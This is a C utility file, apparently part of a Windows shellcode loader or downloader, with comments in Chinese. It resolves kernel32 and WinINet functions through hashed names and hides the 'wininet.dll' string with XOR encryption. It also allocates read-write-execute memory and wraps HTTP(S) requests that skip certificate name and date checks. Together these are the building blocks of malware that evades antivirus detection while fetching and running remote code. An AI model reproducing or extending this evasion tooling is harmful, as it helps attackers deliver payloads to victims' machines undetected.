#include "util.h"

DWORD StrLen(PCHAR str)
{
    DWORD length = 0;
    if (str == NULL)
        return 0;
    while (str[length] != '\0') 
    {
        length++;
    }
    return length;
}

CHAR ToLowerCaseA(CHAR ch) {
    if (ch >= 'A' && ch <= 'Z') {
        return ch + ('a' - 'A');
    }
    return ch;
}

WCHAR ToLowerCaseW(WCHAR ch) {
    if (ch >= L'A' && ch <= L'Z') {
        return ch + (L'a' - L'A');
    }
    return ch;
}

UINT32 HashStringA(PCHAR str) {
    UINT32 hash = DEFAULT_HASHVALUE;
    CHAR c;
    while (c = *str++) {
        c = ToLowerCaseA(c);
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

UINT32 HashStringW(PWCHAR wstr) {
    UINT32 hash = DEFAULT_HASHVALUE;
    WCHAR c;
    while (c = *wstr++) {
        c = ToLowerCaseW(c);
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

HANDLE hKernel32 = _GetModuleHandle(KERNEL32_DLL);

BOOL _ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD  nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead) {
     PReadFile func = (PReadFile)_GetProcAddress(hKernel32, ReadFile);
     if (func == NULL) {
         return FALSE;
     }
     return func(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, NULL);
}

DWORD _GetFileSize(HANDLE hFile) {
     PGetFileSize func = (PGetFileSize)_GetProcAddress(hKernel32, GetFileSize);
     if (func == NULL) {
         return 0;
     }
     return func(hFile, NULL);
}

HANDLE _CreateFileA(LPCSTR lpFileName) {
    PCreateFileA func = (PCreateFileA)_GetProcAddress(hKernel32, CreateFileA);
    if (func == NULL) {
        return NULL;
    }
    return func(lpFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
}

LPVOID _VirtualAlloc(SIZE_T dwSize) {
    PVirtualAlloc func = (PVirtualAlloc)_GetProcAddress(hKernel32, VirtualAlloc);
    if (func == NULL) {
        return NULL;
    }
    return func(NULL,dwSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
}

HMODULE GetWinINetHandle() {
    PLoadLibraryA func = (PLoadLibraryA)_GetProcAddress(hKernel32, LoadLibraryA);
    if (func == NULL) {
        return NULL;
    }
    CHAR wininet[] = { 0x3d,0x1c,0x1d,0x1d,0x1d,0xa,0x7,0x41,0xe,0x19,0x1f,0x74 };
    CHAR key[] = { 'j','u','s','t','s','o','s','o','\0' };
    XorDecrypt(wininet, sizeof(wininet), key);
    return func(wininet);
}

HMODULE hWininet = GetWinINetHandle();

HINTERNET _InternetOpenA() {
    PInternetOpenA func = (PInternetOpenA)_GetProcAddress(hWininet, InternetOpenA);
    if (func == NULL) {
        return NULL;
    }
    return func("", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
}

HINTERNET _InternetConnectA(LPVOID hInternet, LPCSTR host , DWORD port) {
    PInternetConnectA func = (PInternetConnectA)_GetProcAddress(hWininet, InternetConnectA);
    if (func == NULL) {
        return NULL;
    }
    return func(hInternet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
}

HINTERNET _HttpOpenRequestA(LPVOID hConnect, LPCSTR path, DWORD protocolHash) {
    PHttpOpenRequestA func = (PHttpOpenRequestA)_GetProcAddress(hWininet, HttpOpenRequestA);
    if (func == NULL) {
        return NULL;
    }
    DWORD dflag = INTERNET_FLAG_KEEP_CONNECTION;
    if (protocolHash == HTTPS) {
        dflag |= INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    }
    return func(hConnect, NULL, path, "HTTP/1.1", NULL, NULL, dflag, 0);
}

BOOL _HttpSendRequestA(LPVOID hRequest) {
    PHttpSendRequestA func = (PHttpSendRequestA)_GetProcAddress(hWininet, HttpSendRequestA);
    if (func == NULL) {
        return NULL;
    }
    return func(hRequest, NULL, 0, NULL, 0);
}

BOOL _HttpQueryInfoA(LPVOID hRequest, LPVOID lpBuffer, LPDWORD lpdwBufferLength) {
    PHttpQueryInfoA func = (PHttpQueryInfoA)_GetProcAddress(hWininet, HttpQueryInfoA);
    if (func == NULL) {
        return NULL;
    }
    return func(hRequest, HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_STATUS_CODE, lpBuffer, lpdwBufferLength, NULL);
}

BOOL _InternetReadFile(LPVOID hFile, LPVOID lpBuffer, DWORD  dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) {
    PInternetReadFile func = (PInternetReadFile)_GetProcAddress(hWininet, InternetReadFile);
    if (func == NULL) {
        return NULL;
    }
    return func(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
}

BOOL _InternetCloseHandle(LPVOID hInternet) {
    PInternetCloseHandle func = (PInternetCloseHandle)_GetProcAddress(hWininet, InternetCloseHandle);
    if (func == NULL) {
        return NULL;
    }
    return func(hInternet);
}

VOID XorDecrypt(LPVOID Data, DWORD dataSize, PCHAR xorKey) {
    PBYTE pData = (PBYTE)Data;
    DWORD keyLen = StrLen(xorKey);
    for (DWORD i = 0; i < dataSize; ++i)
    {
        pData[i] ^= xorKey[i % keyLen];
    }
}

BOOL ParseUrl(PCHAR url, PDWORD protocolHash,PCHAR host, PDWORD port, PCHAR path) {
    DWORD index = 0;
    DWORD i = 0;
    DWORD len = StrLen(url);
    if (len < 10) {
        return FALSE;
    }

    // 1. 提取协议
    CHAR protocol[8];
    while (url[index] != '\0' && url[index] != ':' && index < 15) {
        protocol[i] = url[index];
        index++;
        i++;
    }
    protocol[i] = '\0';
    index += 3; // 跳过://
    *protocolHash = HashStringA(protocol);
    if (*protocolHash != HTTP && *protocolHash != HTTPS) {
        return FALSE;
    }

    // 2. 提取host
    if (index >= len) {
        return FALSE;
    }
    i = 0;
    while (url[index] != '\0' && url[index] != ':' && url[index] != '/' && i < 255 ) {
        host[i] = url[index];
        index++;
        i++;
    }
    host[i] = '\0';

     //3. 提取端口
    if (index >= len) {
        return FALSE;
    }
    if (url[index] == ':') {
        index++; // 跳过 :
        *port = 0;
        while (url[index] >= '0' && url[index] <= '9') {
            *port = *port * 10 + (url[index] - '0');
            index++;
        }
    }
    else {
        if (HashStringA(protocol) == HTTPS) {
            *port = 443;
        }
        else {
            *port = 80;
        }
    }

    // 4. 提取路径（如果没有则设为/）
    if (index >= len) {
        return FALSE;
    }
    i = 0;
    if (url[index] == '\0') {
        path[0] = '/';
        path[1] = '\0';
    }
    else {
        while (url[index] != '\0') {
            path[i] = url[index];
            index++;
            i++;
        }
        path[i] = '\0';
    }
    return TRUE;
}
